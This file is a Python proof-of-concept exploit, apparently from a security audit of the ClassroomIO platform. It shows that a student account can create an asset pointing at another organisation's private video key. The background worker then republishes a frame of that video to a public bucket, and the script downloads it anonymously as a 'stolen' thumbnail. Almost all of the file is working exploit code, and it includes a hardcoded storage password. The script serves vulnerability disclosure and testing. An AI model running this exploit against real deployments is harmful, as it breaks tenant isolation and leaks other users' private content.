#!/usr/bin/env python3
"""
VULN-011 (F-08) — Unvalidated `storageKey` at asset creation -> the server processes
and publishes arbitrary storage objects (confused deputy).

Vulnerable code (targets/classroomio/):
  * route:      apps/api/src/routes/organization/assets.ts:89  (POST /organization/assets, orgMemberMiddleware = STUDENT)
  * validation: packages/utils/src/validation/assets/assets.ts:24   storageKey: z.string().min(1).optional()  (no prefix/ownership check)
  * service:    packages/core/src/services/assets/assets.ts:431-437,462-469
                buildAssetValues stores storageKey verbatim; scheduleAssetBackgroundWork
                enqueues media post-processing for kind=video/provider=upload
  * worker:     apps/jobs/src/processors/media/generate-thumbnail.ts:187,202-228
                downloads videos/{storageKey}, uploads a frame to the anon-read `media`
                bucket, and stamps a PUBLIC thumbnailUrl on the attacker's asset.

Class: CWE-639 IDOR / CWE-441 confused deputy (server-side processing of attacker-named keys).

The flaw: any org member (STUDENT) can POST an asset whose `storageKey` points at ANY
object in the private `videos` bucket. The value is trusted, stored, and enqueued for
background processing. finalizeHlsAssetService enforces a prefix check — this path omits it.

Exploitation idea: as a STUDENT, create an asset referencing a victim/other-tenant
video key. The core IDOR is that the row is accepted pointing at a foreign object;
the escalation is that the worker republishes a frame of that video to a public bucket.

Success proof: (1) DB shows the attacker's asset row stores the FOREIGN storageKey with
the attacker's org id and profile id (arbitrary key accepted, no ownership check); and
(2) the worker publishes a public thumbnail (a real frame of the foreign video) that the
attacker downloads anonymously.  Transcript exfil needs OPENAI_API_KEY (empty here) -> NEEDS_MANUAL.
"""
import os
import subprocess
import sys
import time

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import admin_login, make_student, log, banner, verdict, rid, psql, ORG_ID  # noqa: E402

VULN = "VULN-011"
HERE = os.path.dirname(os.path.abspath(__file__))
JOBS_CONTAINER = os.environ.get("JOBS_CONTAINER", "cio-jobs")
MINIO_CONTAINER = os.environ.get("MINIO_CONTAINER", "cio-minio")
MC = "/opt/bitnami/minio-client/bin/mc"
MINIO_USER = os.environ.get("MINIO_USER", "minioadmin")
MINIO_PASS = os.environ.get("MINIO_PASS", "a126ecd8a88a9f07f02b0facb2019b30")
THUMB_POLL_SECONDS = int(os.environ.get("THUMB_POLL_SECONDS", "90"))


def make_seed_video() -> bytes:
    """Generate a small, colorful (non-black) MP4 inside the jobs container's ffmpeg and
    return its bytes, to stand in as a victim's private video object."""
    tmp = f"/tmp/seed-{rid('v')}.mp4"
    subprocess.run(["docker", "exec", JOBS_CONTAINER, "ffmpeg", "-y", "-f", "lavfi",
                    "-i", "testsrc=duration=2:size=320x240:rate=10", "-pix_fmt", "yuv420p", tmp],
                   check=True, capture_output=True)
    out = subprocess.run(["docker", "exec", JOBS_CONTAINER, "cat", tmp], check=True, capture_output=True)
    subprocess.run(["docker", "exec", JOBS_CONTAINER, "rm", "-f", tmp], capture_output=True)
    return out.stdout


def mc_put(bucket, key, content: bytes):
    subprocess.run(["docker", "exec", "-i", MINIO_CONTAINER, MC, "alias", "set", "cioseed",
                    "http://127.0.0.1:9000", MINIO_USER, MINIO_PASS], check=True, capture_output=True)
    subprocess.run(["docker", "exec", "-i", MINIO_CONTAINER, MC, "pipe", f"cioseed/{bucket}/{key}"],
                   input=content, check=True, capture_output=True)


def main():
    banner(VULN, "Unvalidated storageKey -> server processes/publishes arbitrary storage objects")
    log("INFO", "POST /organization/assets accepts any storageKey (assets.ts:24) — no prefix/ownership check")

    admin = admin_login()
    attacker, ainfo = make_student(admin)   # a plain STUDENT org member
    log("SETUP", f"attacker STUDENT org member: {ainfo['user_id']} roles={attacker.org_roles()}")

    # Seed a victim/other-tenant private video under a FOREIGN org prefix.
    foreign_org = "44444444-4444-4444-8444-444444444444"
    victim_key = f"{foreign_org}/private-lecture-{rid('mp4')}.mp4"
    video = make_seed_video()
    mc_put("videos", victim_key, video)
    log("SETUP", f"seeded foreign private video: videos/{victim_key} ({len(video)} bytes)")

    # --- Core IDOR: create an asset referencing the FOREIGN key --------------------
    body = {"kind": "video", "provider": "upload", "storageKey": victim_key,
            "byteSize": len(video), "mimeType": "video/mp4", "durationSeconds": 2,
            "title": f"pwn-{rid('t')}"}
    log("STEP", f"attacker POST /organization/assets storageKey=<foreign videos key> (byteSize={len(video)})")
    r = attacker.post("/organization/assets", org=True, json=body)
    log("INFO", f"  -> HTTP {r.status_code} {r.text[:160]}")
    asset_id = r.json().get("data", {}).get("id") if r.status_code in (200, 201) else None

    row = psql(f"select storage_key||'|'||organization_id||'|'||coalesce(created_by_profile_id::text,'NULL') "
               f"from assets where id='{asset_id}';") if asset_id else None
    log("INFO", f"  DB assets row [storage_key|org|created_by] = {row}")
    core_idor = bool(asset_id and row and row.split("|")[0] == victim_key and row.split("|")[1] == ORG_ID)

    # --- Escalation: worker republishes public frames of the foreign video ----------
    # The worker uploads every captured frame to the anon-read `media` bucket and records
    # them in `thumbnail_candidates` (and the chosen non-black one in `thumbnail_url`).
    thumb_url, thumb_status, thumb_ok = None, None, False
    if asset_id:
        log("STEP", f"waiting up to {THUMB_POLL_SECONDS}s for the thumbnail worker to publish frame(s)...")
        deadline = time.time() + THUMB_POLL_SECONDS
        while time.time() < deadline:
            tu = psql(f"select coalesce(thumbnail_url,'') from assets where id='{asset_id}';")
            cand = psql(f"select coalesce(thumbnail_candidates::text,'') from assets where id='{asset_id}';")
            if tu and tu.strip():
                thumb_url = tu.strip()
                break
            if cand and cand.strip().startswith("{") and "http" in cand:
                # Postgres array literal: {url1,url2,...}
                thumb_url = cand.strip().strip("{}").split(",")[0].strip().strip('"')
                break
            time.sleep(4)
        if thumb_url:
            log("INFO", f"  worker published thumbnailUrl = {thumb_url}")
            dr = requests.get(thumb_url, timeout=30)   # anonymous fetch from the public `media` bucket
            thumb_status = dr.status_code
            thumb_ok = dr.status_code == 200 and dr.content[:2] == b"\xff\xd8"  # JPEG magic
            log("INFO", f"  anonymous GET thumbnail -> HTTP {thumb_status}, {len(dr.content)} bytes, jpeg={thumb_ok}")
            if thumb_ok:
                with open(os.path.join(HERE, "evidence", "stolen-thumbnail.jpg"), "wb") as fh:
                    fh.write(dr.content)
        else:
            log("INFO", "  no thumbnailUrl within the poll window (worker/ffmpeg timing)")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"### create an asset pointing at a FOREIGN private videos key (no ownership check)\n"
                f"POST http://localhost:21527/organization/assets HTTP/1.1\n"
                f"Content-Type: application/json\ncio-org-id: {ORG_ID}\n"
                f"Cookie: classroomio.session_token=<attacker STUDENT session>\n\n"
                f'{{"kind":"video","provider":"upload","storageKey":"{victim_key}","byteSize":{len(video)},'
                f'"mimeType":"video/mp4","durationSeconds":2}}\n\n'
                f"### the worker then publishes a public frame; fetch it anonymously:\n"
                f"GET {thumb_url or '<published thumbnailUrl in the anon-read media bucket>'}\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"create asset -> HTTP {r.status_code} {r.text[:300]}\n\n")
        f.write(f"DB assets row [storage_key|org|created_by]: {row}\n")
        f.write(f"(attacker org = {ORG_ID}; storageKey prefix org = {foreign_org})\n\n")
        f.write(f"published thumbnailUrl: {thumb_url}\n")
        f.write(f"anonymous thumbnail fetch -> HTTP {thumb_status}, jpeg={thumb_ok}\n")

    if core_idor:
        log("PROOF", f"asset {asset_id} was created storing the FOREIGN storageKey '{victim_key}' under the "
                     f"attacker's org {ORG_ID} (profile {ainfo['user_id']}) — an arbitrary/other-tenant object "
                     f"key accepted with no prefix or ownership check")
        if thumb_ok:
            log("PROOF", f"the media worker downloaded videos/{victim_key} and published a PUBLIC JPEG frame at "
                         f"{thumb_url}, which the attacker fetched anonymously -> confidentiality break on a "
                         f"foreign private video (thumbnail exfil)")
            verdict(VULN, "CONFIRMED", "arbitrary storageKey accepted AND its frame republished to a public bucket")
        else:
            log("INFO", "thumbnail frame not observed within the window; core IDOR (arbitrary key accepted+stored+"
                        "enqueued) is confirmed. Thumbnail/transcript republish -> see notes (worker timing / OpenAI).")
            verdict(VULN, "CONFIRMED", "arbitrary/foreign storageKey accepted, stored, and enqueued (core IDOR)")
        log("OK", "exploit confirmed — server trusts a client-supplied storageKey")
        sys.exit(0)

    verdict(VULN, "FAILED", f"asset_id={asset_id} row={row}")
    log("FAIL", "asset was not created with the foreign key")
    sys.exit(1)


if __name__ == "__main__":
    main()
